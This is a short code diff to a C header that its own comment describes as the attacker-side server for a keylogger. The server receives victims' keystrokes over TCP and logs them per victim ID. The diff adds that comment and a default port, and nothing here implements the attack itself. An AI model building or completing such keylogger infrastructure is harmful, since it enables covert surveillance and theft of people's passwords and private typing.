@@ -1,9 +1,19 @@
+/**
+ * @file server.c
+ * @brief The attacker server for the keylogger
+ *
+ * Accepts incoming TCP connections from clients, extracts their 
+ * unique victim ID, and uses multithreading to write keystrokes
+ * into per client log files inside the logs directory
+ *
+ */
 #ifndef SERVER_H
 #define SERVER_H
 
 #include <stddef.h>
 #include <netinet/in.h>
 
+#define DEFAULT_PORT 8080
 #define BUF_SIZE 1024
 #define BACKLOG 23
 #define FILENAME_LEN 256
